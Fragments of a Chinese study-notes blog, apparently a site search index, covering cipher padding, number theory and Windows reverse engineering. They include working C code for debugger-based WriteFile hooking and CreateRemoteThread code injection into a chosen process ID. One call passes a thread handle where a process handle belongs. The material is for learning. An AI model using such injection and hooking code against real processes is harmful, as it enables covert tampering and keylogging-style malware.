| 无论原始信息的最后一个块是否满8字节，都需要在后面进行填充。所以DD DD DD DD 00 00 00 04中的00 00 00 04只能理解为填充信息，如果原始信息为DD DD DD DD 00 00 00 04，则填充后的结果应该为DD DD DD DD 00 00 00 04 | 00 00 00 00 00 00 00 08。如此便消除了歧义。 ISO 10126 块的最后一个字节写入填充的长度，其他填充位置写入随机数 … | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | 同样，为了避免歧义，如果长度刚好是8字节的整数倍则填充8字节 PKCS #5 \u0026 PKCS #7 每个填充字节的值是用于填充的字节的个数，即是说，若需要填充N个字节，则每个填充字节值都是N。填充的字节数取决于算法可以处理的最小数据块的字节数量。 … | DD DD DD DD DD DD DD DD | DD DD DD DD 04 04 04 04 | 任何情况下都需要填充。PKCS #5和PKCS #7填充方式相同，但PKCS #5仅为使用64位块大小的块密码定义使用。 ISO/IES 7816-4 ISO/IES 7816-4与位填充的方式相同，在需要填充的第一个位置填充80，之后填充多个00（00的个数可以为0） … | DD DD DD DD DD DD DD DD | DD DD DD DD 80 00 00 00 | 补零 在块的最后填充0以达到块的定长 … | DD DD DD DD DD DD DD DD | DD DD DD DD 00 00 00 00 | 该方式在原始信息末尾几个字节为00时同样会产生歧义，而且前面的方法无法解决该歧义。但0填充可以应用在从其他方面可以获知原始消息长度的情况下。通常0填充可以应用在二进制编码的字符串中，在字符串中，填充的0作为空字符而不需要显示。 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:6:2","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"Openssl中的填充方式 Openssl中的填充方式有以下几种 不填充 PKCS #7 0填充 ANSI X.923 ISO 10126 其中 PKCS #7是默认的填充方式 ","date":"2020-05-23","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/:7:0","tags":null,"title":"密码学","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%A4%A9-%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"categories":["notes"],"content":"调试钩取 流程如下： 对想钩取的进程进行附加操作，使之成为被调试者 钩子：将API起始地址的第一个字节修改为0xCC 调用相应API时，控制权转移到调试器 执行需要的操作(操作参数、返回值等) 脱钩：将0xCC恢复为原来的值(正常运行API) 运行相应API（无0xCC的正常状态） 钩子：再次修改为0xCC（为了继续钩取） 控制权返还给被调试者 # include \"windows.h\" # include \"stdio.h\" LPVOID g_pfWriteFile = NULL; CREATE_PROCESS_DEBUG_INFO g_cpdi; BYTE g_chINT3 = 0xCC; BYTE g_ch0rgByte = 0; BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde) { // 获取WriteFile() API的地址 g_pfWriteFile = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WriteFile\"); printf(\"g_pfWriteFile：%d\\n\", g_pfWriteFile); // API钩子 WriteFile() memcpy(\u0026g_cpdi, \u0026pde-\u003eu.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_EVENT)); ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \u0026g_ch0rgByte, sizeof(BYTE), NULL); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \u0026g_chINT3, sizeof(BYTE), NULL); return TRUE; } BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde) { CONTEXT ctx; PBYTE lpBuffer = NULL; DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i; PEXCEPTION_RECORD per = \u0026pde-\u003eu.Exception.ExceptionRecord; if (EXCEPTION_BREAKPOINT == per-\u003eExceptionCode) { if (g_pfWriteFile == per-\u003eExceptionAddress) { // 将0xcc恢复为original byte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \u0026g_ch0rgByte, sizeof(BYTE), NULL); // 获取线程上下文 ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThread, \u0026ctx); // 获取WriteFile的第2，3个参数 ReadProcessMemory(g_cpdi.hProcess, (LPCVOID)(ctx.Esp + 8), \u0026dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPCVOID)(ctx.Esp + 0xc), \u0026dwNumOfBytesToWrite, sizeof(DWORD), NULL); /*dwAddrOfBuffer = ctx.Rsi; dwNumOfBytesToWrite = ctx.Rdx;*/ printf(\"size: %d\\n\", dwNumOfBytesToWrite); // 分配临时缓冲区 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite + 1); memset(lpBuffer, 0, dwNumOfBytesToWrite + 1); // 复制WriteFile缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPCVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); printf(\"\\noriginal string: %s\\n\", lpBuffer); // 小写字母转大写字母 for (i = 0; i \u003c dwNumOfBytesToWrite; i++) { if (0x61 \u003c= lpBuffer[i] \u0026\u0026 lpBuffer[i] \u003c= 0x7A) { lpBuffer[i] = lpBuffer[i] - 0x20; } } printf(\"\\nconverted string: %s\\n\", lpBuffer); // 将变换后的缓冲区换到WriteFile中 WriteProcessMemory(g_cpdi.hThread, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); free(lpBuffer); // 将线程上下文的EIP更改为WriteFile的首地址 ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, \u0026ctx); ContinueDebugEvent(pde-\u003edwProcessId, pde-\u003edwThreadId, DBG_CONTINUE); Sleep(0); WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, \u0026g_chINT3, sizeof(BYTE), NULL); return TRUE; } } return FALSE; } void DebugLoop() { DEBUG_EVENT de; DWORD dwContinueStatus; while (WaitForDebugEvent(\u0026de, INFINITE)) { dwContinueStatus = DBG_CONTINUE; // 被调试进程生成或附加 if (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) OnCreateProcessDebugEvent(\u0026de); // 异常 else if (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode) { if (OnExceptionDebugEvent(\u0026de)) continue; } // 中止 else if (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) break; ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); } } int main(int argc, char* argv[]) { DWORD dwPID; dwPID = atoi(argv[1]); // 使调试器附加到一个活动进程并且调试它 if (!DebugActiveProcess(dwPID)) { printf(\"DebugActiveProcess failed\\n\"); return 1; } DebugLoop(); return 0; } ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%A4%A9-api%E9%92%A9%E5%8F%96/:1:0","tags":null,"title":"API勾取","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%A4%A9-api%E9%92%A9%E5%8F%96/"},{"categories":["notes"],"content":"广义欧几里得除法 a = q * b + c, 0 \u003c= c \u003c b; 则(a, b) = (b, c)，可以用来计算最大公因数 def gcd(a, b): # a \u003c= b if a * b == 0: return 0 r = b // a c = b % a while c != 0: # print(\"%d = %d * %d + %d\"%(b, r, a, c)) b = a a = c r = b // a c = b % a return a ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:1:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"算数基本定理 任意整数n \u003e 1都可以表示成素数的乘积， 且在不考虑乘积顺序的情况下，该表达式唯一。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:2:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"欧拉函数 设m是一个正整数，则m个整数1,2,3…m中，与m互素的整数个数，计做$\\varphi$，通常叫做欧拉函数。 欧拉函数性质： 假设m, n是互素的两个正整数，则 $\\varphi(m*n) = \\varphi(m) * \\varphi(n)$ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:3:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"欧拉定理 (Euler) 设m是大于1的整数，如果a是满足$(a, m) = 1$的整数，则 $a^{\\varphi(m)} \\equiv 1(mod;m)$ 但是使得$a^e \\equiv 1(mod;m)$成立的最小整数e不一定是$\\varphi(m)$, 只有$e \\leq \\varphi(m)$，如果取等号则a称为m的原根。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:4:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"费马小定理 (Fermat) 设p是一个素数，则对任意整数a，有： $a^p\\equiv a(mod;p)$ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:5:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"Wilson定理 (Wilson) 设p是一个素数，则 $(p-1)! \\equiv -1 (mod;p)$ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:6:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"同余式 设m是一个正整数，m不是a的因子，则一次同余式$ax \\equiv 1(mod;m)$有解的充分必要条件是 $(a, m) =1$ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:7:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"中国剩余定理 设$m_1, m_2, m_3,…,m_k$是k个两两互素的正整数，则对任意的整数$b_1, b_2, …, b_n$同余式组 $x \\equiv b_1(mod;m_1)$ … $x \\equiv b_k(mod;m_k)$ 一定有解，且解唯一。 # sage def CRT(mi, ai): assert(isinstance(mi, list) and isinstance(ai, list)) assert(reduce(gcd, mi) == 1) # mi之间互素 M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M // m) * inverse_mod(M // m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M # sage中也有crt函数 # sage: x = crt(2, 1, 3, 5); x # 11 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:8:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"平方剩余 设m是正整数，若同余式 $x^2 \\equiv a (mod;m),:(a, m) = 1$ 有解，则a叫做m的平方剩余(或二次剩余)；否则，a叫做模m的平方非剩余。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:9:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"欧拉判别条件 设p是奇素数，(a, p) = 1, 则 (i) a是模p的平方剩余的充分必要条件是 $a^{\\frac{p-1} 2} \\equiv 1(mod;p)$ (ii) a是模p的平方非剩余的充分必要条件是 $a^{\\frac{p-1} 2} \\equiv -1(mod;p)$ 由这个判别推出勒让得符号和雅克比符号 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:10:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"群 设G是一个具有结合法的非空集合，G叫做一个群，如果G中的结合法满足以下三个条件， (i) 结合律：即对任意的$a, b, c \\in G$，都有 $(ab)c=a(bc)$ (ii) 单位元：即存在一个元素$e \\in G$，使得对任意$a \\in G$，都有 $ae=ea=a$ (iii) 可逆性：即对任意的$a \\in G$，都存在$a' \\in G$，使得 $aa' = a’a = e$ 特别的，当G的结合法写作乘法时，G叫做乘群，当G的结合法写作加法时，G叫做加群。群G中元素的个数叫做群G的阶。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:11:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"同态和同构 设G, G’都是群，f是G到G’的一个映射，如果对任意的$a, b \\in G$， 都有 $f(a, b) = f(a) f(b)$ 则f叫做G到G’的一个同态，如果f是一一对应的，则称f为同构。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:12:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"环 设R是具有两种结合法(通常表示为加法和乘法)的非空集合，如果以下条件成立： (i) R对于加法构成一个交换群 (ii) (结合律) 对任意的$a,b,c \\in R$，有$(ab)c=a(bc)$ (iii) (分配律) 对任意的$a, b, c \\in R$，有 $(a + b)c = ac + bc$和$a(b + c) = ab + ac$ 则R称为环。(即加法构成交换群，乘法满足结合率，加法乘法满足分配律) (iv) 对任意的$a,b,c \\in R$，有$ab = ba$，则R叫做交换环 (v) 对任意的$a \\in R$，有$a 1_R=1_Ra=a$，则R叫做有单位元环。 ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:13:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"域 称交换环K为一个域，如果K中有单位元，且每个非零元都是可逆元，即K对于加法构成一个交换群，$K* = K \\ {0}$对于乘法构成一个交换群。域$F_p$ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:14:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"多项式环 设R为整环，x为变量，则R上形为 $a_nx^n + … + a_1x + a_0,::a_i \\in R$ 的元素称为R上的多项式。 设$f(x) = a_nx^n + … + a_1x + a_0,::a_i \\neq R$是整环R上的多项式，如果再定义加法和乘法则可以生成整环R[x] 注意定义多项式环需要声明是定义在哪个环或者域上的。 $Z[x]$：定义在整数环上的多项式环 $F_2[x]$：定义在域$F_2$上的多项式环 GF(2)到GF(2^8)的扩张: https://blog.openacid.com/storage/ec-2/ ","date":"2020-05-21","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/:15:0","tags":null,"title":"信息安全数学基础","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%A4%A9-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"categories":["notes"],"content":"代码注入是一种向目标进程插入独立运行代码并使之运行的技术，一般调用CreateRemoteThread()API以远程线程形式运行插入的代码，所以也被称为线程注入。 首先向目标进程插入代码和数据，在此过程中，代码以线程过程形式插入，而代码中使用的数据则以线程参数的形式传入，也就是说代码与数据是分别注入的。 // CodeInjection.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。 // #include \"windows.h\" #include \"stdio.h\" #include \"windef.h\" typedef struct _THREAD_PARAM { //FARPROC是一个(int FAR WINAPI*)()类型的指针 FARPROC pFunc[2]; // LoadLibraryA(), GetProcAddress() char szBuf[4][128]; // \"user32.dll\", \"MessageBoxA\", // \"www.reversecore.com\", \"ReverseCore\" } THREAD_PARAM, *PTHREAF_PARAM; // LoadLibraryA() 函数指针PFLOADLIBRARYA typedef HMODULE (WINAPI *PFLOADLIBRARYA)(LPCSTR lpLibFileName); // GetProcAddress() typedef FARPROC (WINAPI *PFGETPROCADDRESS) ( HMODULE hModule, LPCSTR lpProcName ); // MessageBoxA() typedef int (WINAPI *PFMESSAGEBOXA) ( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType ); // Thread Procedure DWORD WINAPI ThreadProc(LPVOID lParam) { PTHREAF_PARAM pParam = (PTHREAF_PARAM)lParam; HMODULE hMod = NULL; FARPROC pFunc = NULL; // LoadLibraryA(\"user32.dll\") // pParam-\u003epFunc[0] -\u003e kernel32!LoadLibraryA() // pParam-\u003eszBuf[0] -\u003e \"user32.dll\" hMod = ((PFLOADLIBRARYA)pParam-\u003epFunc[0])(pParam-\u003eszBuf[0]); // GetProcAddress(\"MessageBoxA\") // pParam-\u003epFunc[1] -\u003e kernel32!GetProcAddress() // pParam-\u003eszBuf[1] -\u003e \"MessageBoxA\" pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-\u003epFunc[1])(hMod, pParam-\u003eszBuf[1]); // MessageBoxA(NULL, \"www...\", \"ReverseCore\", MB_OK) // pParam-\u003eszBuf[2] = \"www...\" // pParam-\u003eszBuf[3] = \"ReverseCore\" ((PFMESSAGEBOXA)pFunc)(NULL, pParam-\u003eszBuf[2], pParam-\u003eszBuf[3], MB_OK); return 0; } BOOL InjectCode(DWORD dwPID) { HMODULE hMod = NULL; THREAD_PARAM param = { 0, }; HANDLE hProcess = NULL; HANDLE hThread = NULL; LPVOID pRemoteBuf[2] = { 0, }; DWORD dwSize = 0; hMod = GetModuleHandleA(\"kernel32.dll\"); param.pFunc[0] = GetProcAddress(hMod, \"LoadLibraryA\"); param.pFunc[1] = GetProcAddress(hMod, \"GetProcAddress\"); strcpy_s(param.szBuf[0], \"user32.dll\"); strcpy_s(param.szBuf[1], \"MessageBoxA\"); strcpy_s(param.szBuf[2], \"www.reversecore.com\"); strcpy_s(param.szBuf[3], \"ReverseCore\"); // OpenProcess hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); // Allocation for THREAD_PRARM dwSize = sizeof(THREAD_PARAM); pRemoteBuf[0] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); if (pRemoteBuf[0] == NULL) { printf(\"VirtualAllocEx failed\\n\"); return FALSE; } if (!WriteProcessMemory(hProcess, pRemoteBuf[0], (LPVOID)\u0026param, dwSize, NULL)) { printf(\"WriteProcessMemory failed\\n\"); return FALSE; } // Allocation for ThreadProc dwSize = (DWORD)InjectCode - (DWORD)ThreadProc; printf(\"dwSize: %d\\n\", dwSize); pRemoteBuf[1] = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 这里注意要有可执行权限 if (pRemoteBuf[1] == NULL) { printf(\"VirtualAllocEx failed\\n\"); return FALSE; } if (!WriteProcessMemory(hProcess, pRemoteBuf[1], (LPVOID)ThreadProc, dwSize, NULL)) { printf(\"WriteProcessMemory failed\\n\"); return FALSE; } hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf[1], pRemoteBuf[0], 0, NULL); if (hThread == NULL) { printf(\"CreateRemoteThread failed\\n\"); return FALSE; } WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int main(int argc, char *argv[]) { DWORD dwPID = 0; if (argc != 2) { printf(\"\\nusage: %s PID\\n\", argv[0]); return 1; } dwPID = (DWORD)atol(argv[1]); InjectCode(dwPID); return 0; } 执行的时候注意要生成release版本，因为MS Virual C++中使用Release模式编译程序代码后，源代码中函数顺序与二进制代码中的顺序是一致的，所以代码中的InjectCode-ThreadProc才可以表示ThreadProc函数的大小。 将PID设置成notepad.exe的PID时，结果如下: ","date":"2020-05-20","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%A4%A9-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/:0:0","tags":null,"title":"代码注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%A4%A9-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"参考文献 逆向工程核心原理 ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:1:0","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"Windows消息勾取 ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:2:0","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"消息钩子 Windows操作系统向用户提供GUI，它以事件驱动方式工作，在操作系统中借助键盘、鼠标、选择菜单、按钮以及移动鼠标等都是事件(Event)。发生这些事件时，OS会把事先定义好的消息发送给相应的应用程序，应用程序分析收到的消息后执行相应的动作。 常规Windows消息流 发生键盘输入事件时，WM_KETDOWN消息被添加到[OS message queue]. OS判断那个应用程序发生了事件，然后从[OS message queue]中取出消息，添加到相应应用程序的[application message queue]中。 应用程序监视自身的[application message queue], 发现新添加的 WM_KEYDOWN消息后，调用相应的事件处理程序处理。 OS消息队列与应用程序消息队列之间存在一条钩链(Hook Chain)，设置好键盘消息钩子之后，处于钩链中的键盘消息钩子会比应用程序先看到相应信息。在键盘消息钩子函数的内部，除了可以查看消息之外，还可以修改消息本身，而且还能对消息实施拦截，阻止消息传递。 ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:2:1","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"SetWindowsHookEx函数 HHOOK SetWindowsHookEx( int idHook, // hook type HOOKPROC lpfn, // hook procedure HINSTANCE hMod, // hook procedure所属的DLL句柄 (Handle) DWORD dwThreadID // 想要挂钩的线程ID ); 钩子过程(hook 